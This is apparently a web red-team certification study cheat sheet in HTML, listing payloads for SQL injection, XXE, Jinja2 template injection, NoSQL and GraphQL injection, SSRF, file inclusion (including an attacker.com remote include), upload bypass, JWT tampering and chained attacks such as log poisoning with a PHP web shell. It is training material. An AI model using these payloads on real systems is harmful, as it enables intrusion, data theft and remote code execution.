@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Red Team Analyst (WEB-RTA) Study Notes</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
+<style>
+    :root {
+        --bg-primary: #0a0a0f;
+        --bg-secondary: #12121a;
+        --bg-code: #1a1a24;
+        --accent: #00ff88;
+        --accent-dim: #00cc6a;
+        --text: #e4e4e7;
+        --text-dim: #a1a1aa;
+        --border: #27272a;
+    }
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+        font-family: 'Segoe UI', system-ui, sans-serif;
+        background: var(--bg-primary);
+        color: var(--text);
+        line-height: 1.8;
+        padding: 40px 20px;
+        max-width: 900px;
+        margin: 0 auto;
+    }
+    
+    .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.875rem;
+        margin-bottom: 32px;
+        padding: 8px 16px;
+        background: var(--bg-secondary);
+        border-radius: 8px;
+        border: 1px solid var(--border);
+        transition: all 0.3s;
+    }
+    
+    .back-link:hover {
+        background: var(--bg-code);
+        border-color: var(--accent);
+    }
+    
+    h1 {
+        font-size: 2.5rem;
+        margin-bottom: 16px;
+        color: var(--text);
+        border-bottom: 2px solid var(--accent);
+        padding-bottom: 16px;
+    }
+    
+    h2 {
+        font-size: 1.75rem;
+        margin: 48px 0 16px;
+        color: var(--text);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+    
+    h2::before {
+        content: '##';
+        color: var(--accent);
+        font-family: monospace;
+        font-size: 1rem;
+    }
+    
+    h3 {
+        font-size: 1.25rem;
+        margin: 32px 0 12px;
+        color: var(--text-dim);
+    }
+    
+    p { margin-bottom: 16px; }
+    
+    a {
+        color: var(--accent);
+        text-decoration: none;
+        border-bottom: 1px solid transparent;
+        transition: border-color 0.3s;
+    }
+    
+    a:hover { border-bottom-color: var(--accent); }
+    
+    img {
+        max-width: 100%;
+        height: auto;
+        border-radius: 12px;
+        margin: 24px 0;
+        border: 1px solid var(--border);
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+    }
+    
+    code {
+        font-family: 'JetBrains Mono', 'Fira Code', monospace;
+        background: var(--bg-code);
+        padding: 2px 8px;
+        border-radius: 4px;
+        font-size: 0.9em;
+        color: var(--accent);
+        border: 1px solid var(--border);
+    }
+    
+    pre {
+        background: var(--bg-secondary);
+        padding: 20px;
+        border-radius: 12px;
+        overflow-x: auto;
+        margin: 24px 0;
+        border: 1px solid var(--border);
+        position: relative;
+    }
+    
+    pre::before {
+        content: 'terminal';
+        position: absolute;
+        top: 8px;
+        right: 12px;
+        font-size: 0.75rem;
+        color: var(--text-dim);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    
+    pre code {
+        background: none;
+        padding: 0;
+        border: none;
+        color: var(--text);
+    }
+    
+    blockquote {
+        border-left: 3px solid var(--accent);
+        padding-left: 20px;
+        margin: 24px 0;
+        color: var(--text-dim);
+        font-style: italic;
+    }
+    
+    ul, ol {
+        margin: 16px 0 16px 24px;
+    }
+    
+    li {
+        margin-bottom: 8px;
+    }
+    
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 24px 0;
+    }
+    
+    th, td {
+        padding: 12px 16px;
+        text-align: left;
+        border: 1px solid var(--border);
+    }
+    
+    th {
+        background: var(--bg-secondary);
+        color: var(--accent);
+        font-weight: 600;
+    }
+    
+    tr:nth-child(even) { background: var(--bg-secondary); }
+    
+    hr {
+        border: none;
+        height: 1px;
+        background: var(--border);
+        margin: 40px 0;
+    }
+    
+    .meta {
+        display: flex;
+        gap: 24px;
+        margin-bottom: 32px;
+        padding: 16px;
+        background: var(--bg-secondary);
+        border-radius: 8px;
+        font-size: 0.875rem;
+        color: var(--text-dim);
+    }
+    
+    .meta-item {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+    }
+</style>
+
+</head>
+<body>
+    <a href="../index.html" class="back-link">← Back to Index</a>
+    <div class="meta">
+        <span class="meta-item">📅 Updated: 2025-12-30</span>
+        <span class="meta-item">📂 CheatSheets</span>
+    </div>
+    <article>
+        <h1>Web Red Team Analyst (WEB-RTA) Study Notes</h1>
+
+<h2>Module 1: Web Application Fundamentals</h2>
+
+<h3>Core Components</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Component</th>
+  <th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Web Server</td>
+  <td>Accepts requests, directs to destination</td>
+</tr>
+<tr>
+  <td>Application Server</td>
+  <td>Processing tasks, delivers responses</td>
+</tr>
+<tr>
+  <td>Database</td>
+  <td>Stores, retrieves, organizes data</td>
+</tr>
+</tbody>
+</table>
+
+<h3>Architecture Layers</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Layer</th>
+  <th>Components</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Presentation</td>
+  <td>Web Server</td>
+</tr>
+<tr>
+  <td>Business</td>
+  <td>API Layer, Business Logic, Legacy Systems</td>
+</tr>
+<tr>
+  <td>Data</td>
+  <td>Database Service, Third Party Services</td>
+</tr>
+</tbody>
+</table>
+
+<h3>OWASP Resources</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Resource</th>
+  <th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>OWASP Top 10</td>
+  <td>Top exploited vulns (Web, API, LLM, CI/CD) - 4 year cycle</td>
+</tr>
+<tr>
+  <td>WSTG</td>
+  <td>Web Security Testing Guide - methodologies &amp; checklists</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2>Module 2: Tools</h2>
+
+<h3>Burp Suite (PortSwigger)</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Tool</th>
+  <th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Proxy</td>
+  <td>Intercept &amp; modify HTTP(S) traffic</td>
+</tr>
+<tr>
+  <td>Intruder</td>
+  <td>Automated requests, SQLi testing, brute-force</td>
+</tr>
+<tr>
+  <td>Repeater</td>
+  <td>Manual request modification &amp; resend</td>
+</tr>
+<tr>
+  <td>Scanner</td>
+  <td>Automated vuln scanning (Pro)</td>
+</tr>
+<tr>
+  <td>Collaborator</td>
+  <td>OOB interaction detection (Pro)</td>
+</tr>
+</tbody>
+</table>
+
+<h3>Nuclei (ProjectDiscovery)</h3>
+
+<ul>
+<li>YAML-based vulnerability scanner</li>
+<li>Targets: Apps, APIs, Networks, DNS, Cloud</li>
+<li>Community-contributed templates</li>
+</ul>
+
+<hr />
+
+<h2>Module 3-4: OSINT &amp; Reconnaissance</h2>
+
+<h3>Techniques &amp; Tools</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Technique</th>
+  <th>Tool</th>
+  <th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>DNS Recon</td>
+  <td>DNSDumpster</td>
+  <td>Map attack surface</td>
+</tr>
+<tr>
+  <td>Subdomain Enum</td>
+  <td>Crt.sh</td>
+  <td>Find additional targets via CT logs</td>
+</tr>
+<tr>
+  <td>WHOIS</td>
+  <td>Whois.com</td>
+  <td>Ownership &amp; registration data</td>
+</tr>
+<tr>
+  <td>Google Dorking</td>
+  <td>GHDB</td>
+  <td>Extract info via search operators</td>
+</tr>
+</tbody>
+</table>
+
+<h3>Google Dork Examples</h3>
+
+<pre><code>inurl:/wp-content/uploads/ ext:txt "username" | "user name"
+intitle:"Index of" inurl:/backup/ "admin.zip"
+</code></pre>
+
+<h3>FFUF</h3>
+
+<p>Fast fuzzing for directories, files, parameters, headers, POST data.</p>
+
+<hr />
+
+<h2>Module 5: WAF Bypass</h2>
+
+<table>
+<thead>
+<tr>
+  <th>Technique</th>
+  <th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>URL Encoding</td>
+  <td><code>&lt;script&gt;</code> → <code>%3Cscript%3E</code></td>
+</tr>
+<tr>
+  <td>Double Encoding</td>
+  <td><code>&lt;</code> → <code>%253C</code></td>
+</tr>
+<tr>
+  <td>Case Changing</td>
+  <td><code>&lt;ScRiPt&gt;</code>, <code>SeLeCt</code>, <code>UniOn</code></td>
+</tr>
+<tr>
+  <td>Content-Type Manipulation</td>
+  <td>Change header, add charsets</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2>Module 6: Injection Attacks</h2>
+
+<h3>SQL Fundamentals</h3>
+
+<p><strong>Clauses:</strong> WHERE, ORDER BY, GROUP BY, HAVING, LIMIT</p>
+
+<p><strong>Operators:</strong> <code>=</code>, <code>!=</code>, <code>&lt;&gt;</code>, <code>&gt;</code>, <code>&lt;</code>, <code>AND</code>, <code>OR</code>, <code>NOT</code>, <code>IN</code>, <code>BETWEEN</code>, <code>LIKE</code>, <code>IS NULL</code></p>
+
+<h3>SQL Injection Types</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Type</th>
+  <th>Description</th>
+  <th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Error-Based</td>
+  <td>Forces verbose errors</td>
+  <td><code>' OR 1=1--</code></td>
+</tr>
+<tr>
+  <td>Union-Based</td>
+  <td>Extract data via UNION</td>
+  <td><code>' UNION SELECT username,password FROM users--</code></td>
+</tr>
+<tr>
+  <td>Boolean Blind</td>
+  <td>Infer from true/false</td>
+  <td><code>' AND 1=1--</code> vs <code>' AND 1=2--</code></td>
+</tr>
+<tr>
+  <td>Time-Based Blind</td>
+  <td>Infer from delays</td>
+  <td><code>' OR IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--</code></td>
+</tr>
+</tbody>
+</table>
+
+<h3>SQLi Payloads</h3>
+
+<pre><code>// Auth Bypass
+{"username": "admin' --", "password": "anything"}
+
+// Column Enumeration
+{"username": "admin' OR 1=1 ORDER BY 100--", "password": "anything"}
+
+// Union - Column Count (increment NULLs)
+{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "password": "anything"}
+
+// Time-Based (PostgreSQL)
+{"username": "admin' OR 1=1; SELECT pg_sleep(5)--", "password": "anything"}
+</code></pre>
+
+<h3>XXE (XML External Entity)</h3>
+
+<pre><code>&lt;!-- Classic XXE - File Read --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;
+
+&lt;!-- Blind XXE (OOB) --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "https://webhook.site/&lt;UUID&gt;"&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;
+</code></pre>
+
+<h3>SSTI (Server-Side Template Injection)</h3>
+
+<pre><code>// Detection
+{{7*7}} → 49
+
+// File Read (Jinja2)
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+// RCE (Jinja2)
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+</code></pre>
+
+<h3>NoSQL Injection</h3>
+
+<pre><code>// Boolean-Based
+{ "owner": { "$ne": "" } }
+
+// Regex Wildcard
+{ "owner": { "$regex": ".*" } }
+
+// OR-Based
+{ "$or": [{ "owner": "admin" }, { "owner": { "$ne": "admin" } }] }
+
+// Error-Based
+{ "owner": { "$abcd": "123" } }
+</code></pre>
+
+<h3>GraphQL Injection</h3>
+
+<pre><code>// Error-Based
+{"query":"{ user(username:\"qwe'\") { id username balance } }"}
+
+// Introspection
+{"query":"{ __schema { types { name fields { name } } } }"}
+</code></pre>
+
+<h3>Command Injection</h3>
+
+<p>Test payloads: <code>ls</code>, <code>id</code>, <code>whoami</code></p>
+
+<hr />
+
+<h2>Module 7: Authentication &amp; Session</h2>
+
+<h3>AuthN vs AuthZ</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Concept</th>
+  <th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Authentication</td>
+  <td>Verify user identity</td>
+</tr>
+<tr>
+  <td>Authorization</td>
+  <td>Verify user privileges</td>
+</tr>
+</tbody>
+</table>
+
+<h3>Brute Force Types</h3>
+
+<p>Simple, Dictionary, Credential Stuffing, Reverse, Hybrid</p>
+
+<h3>Session Attacks</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Attack</th>
+  <th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Session Hijacking</td>
+  <td>Take over valid session</td>
+</tr>
+<tr>
+  <td>Session Fixation</td>
+  <td>Set/supply session ID victim authenticates with</td>
+</tr>
+<tr>
+  <td>Cookie Manipulation</td>
+  <td>Manipulate cookies to impersonate</td>
+</tr>
+</tbody>
+</table>
+
+<h3>IDOR</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Type</th>
+  <th>Description</th>
+  <th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Horizontal</td>
+  <td>Access same-level user data</td>
+  <td><code>user_id=1001</code> → <code>user_id=1002</code></td>
+</tr>
+<tr>
+  <td>Vertical</td>
+  <td>Cross privilege boundaries</td>
+  <td><code>role=user</code> → <code>role=admin</code></td>
+</tr>
+</tbody>
+</table>
+
+<h3>JWT Structure</h3>
+
+<pre><code>HEADER.PAYLOAD.SIGNATURE
+
+Header: {"alg":"HS256","typ":"JWT"}
+Payload: Claims (user data, exp, etc.)
+Signature: Verification
+</code></pre>
+
+<hr />
+
+<h2>Module 8: Advanced Attacks</h2>
+
+<h3>Insecure Deserialization</h3>
+
+<p><strong>Serialization:</strong> Object → Bytes | <strong>Deserialization:</strong> Bytes → Object</p>
+
+<p>Attack: Inject malicious object that executes during deserialization.</p>
+
+<h3>SSRF Targets</h3>
+
+<pre><code>http://127.0.0.1/admin
+http://localhost/admin
+http://169.254.169.254/latest/meta-data/  (AWS)
+http://[::1]/admin  (IPv6)
+</code></pre>
+
+<h3>File Inclusion</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Type</th>
+  <th>Source</th>
+  <th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>LFI</td>
+  <td>Local server</td>
+  <td><code>?page=../../../etc/passwd</code></td>
+</tr>
+<tr>
+  <td>RFI</td>
+  <td>External</td>
+  <td><code>?page=http://attacker.com/shell.txt</code></td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>LFI Payloads:</strong></p>
+
+<pre><code>../../../etc/passwd
+....//....//....//etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+
+<h3>Path Traversal Payloads</h3>
+
+<pre><code>../../../etc/passwd
+..%252f..%252f..%252fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+</code></pre>
+
+<h3>Prototype Pollution</h3>
+
+<pre><code>{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+</code></pre>
+
+<h3>File Upload Bypass</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Technique</th>
+  <th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Double extension</td>
+  <td><code>shell.php.png</code></td>
+</tr>
+<tr>
+  <td>Null byte</td>
+  <td><code>shell.php%00.png</code></td>
+</tr>
+<tr>
+  <td>Case manipulation</td>
+  <td><code>shell.PhP</code></td>
+</tr>
+<tr>
+  <td>Magic bytes</td>
+  <td>Add PNG header to PHP</td>
+</tr>
+<tr>
+  <td>Alt extensions</td>
+  <td><code>.php5</code>, <code>.phtml</code>, <code>.phar</code></td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2>Module 9: Chained Attacks</h2>
+
+<h3>Chain 1: LFI → Log Poisoning → RCE</h3>
+
+<ol>
+<li>Confirm LFI: <code>?page=../../../etc/passwd</code></li>
+<li>Poison logs: <code>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target/</code></li>
+<li>Include log: <code>?page=../../../var/log/apache2/access.log&amp;cmd=id</code></li>
+</ol>
+
+<p><strong>Common Log Paths:</strong></p>
+
+<pre><code>/var/log/apache2/access.log
+/var/log/nginx/access.log
+/proc/self/environ
+</code></pre>
+
+<h3>Chain 2: SQLi → XXE → File Read</h3>
+
+<ol>
+<li>SQLi bypass: <code>Admin' --</code></li>
+<li>XXE in XML input: <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></li>
+<li>Extract via SQLi: <code>' UNION SELECT product, name FROM items WHERE id=1 --</code></li>
+</ol>
+
+<h3>Chain 3: JWT KID → SSRF</h3>
+
+<p>Modify JWT <code>kid</code> header to attacker URL:</p>
+
+<pre><code>{"alg": "HS256", "typ": "JWT", "kid": "http://internal-server/admin"}
+</code></pre>
+
+<h3>Chain 4: Broken Session → SSTI → RCE</h3>
+
+<ol>
+<li>Modify JWT: <code>"role": "user"</code> → <code>"role": "admin"</code></li>
+<li>Access admin panel</li>
+<li>SSTI: <code>{{7*7}}</code> → <code>{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}</code></li>
+</ol>
+
+<h3>Chain 5: OAuth → XXE → Deserialization → RCE</h3>
+
+<ol>
+<li>Scope upgrade: <code>scope=read</code> → <code>scope=admin</code></li>
+<li>XXE to read config</li>
+<li>Extract machine keys</li>
+<li>Deserialization RCE</li>
+</ol>
+
+<h3>Chain Summary</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Chain</th>
+  <th>Entry → Pivot → Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>LFI → Log Poison</td>
+  <td>File Inclusion → Logs → RCE</td>
+</tr>
+<tr>
+  <td>SQLi → XXE</td>
+  <td>Database → XML Parser → File Read</td>
+</tr>
+<tr>
+  <td>JWT KID → SSRF</td>
+  <td>Token Header → Key Fetch → Internal Access</td>
+</tr>
+<tr>
+  <td>Session → SSTI</td>
+  <td>Auth Bypass → Template → RCE</td>
+</tr>
+<tr>
+  <td>OAuth → Deser</td>
+  <td>Authorization → Config → RCE</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2>Lab Quick Reference</h2>
+
+<h3>Brute Force - PIN Reset</h3>
+
+<ol>
+<li>Intercept <code>/reset-password</code> with Burp</li>
+<li>Send to Intruder, set PIN as payload position</li>
+<li>Payload: Numbers (100-999)</li>
+<li>Identify correct PIN by response length</li>
+</ol>
+
+<h3>BOLA</h3>
+
+<p>Replace User B's JWT with User A's token to access User A's resources.</p>
+
+<h3>IDOR Examples</h3>
+
+<pre><code>GET /transactions/&lt;victim_account&gt;
+POST /api/virtual-cards/&lt;victim_card_id&gt;/toggle-freeze
+</code></pre>
+
+<h3>OAuth Attacks</h3>
+
+<pre><code># Redirect manipulation
+redirect_url=https://evil.com
+
+# Scope upgrade
+scope=read → scope=admin
+</code></pre>
+
+<h3>JWT Privilege Escalation</h3>
+
+<ol>
+<li>Decode at jwt.io</li>
+<li>Modify: <code>"is_admin": false</code> → <code>"is_admin": true</code></li>
+<li>Replace token (signature validation may be skipped)</li>
+</ol>
+
+<h3>LFI → RCE Lab</h3>
+
+<pre><code># 1. Confirm LFI
+http://target/index.php?search=..%2F..%2F..%2Fetc%2Fpasswd
+
+# 2. Poison logs
+curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target/
+
+# 3. Trigger RCE
+http://target/index.php?search=logs%2Faccess.log&amp;cmd=id
+</code></pre>
+
+    </article>
+</body>
+</html>
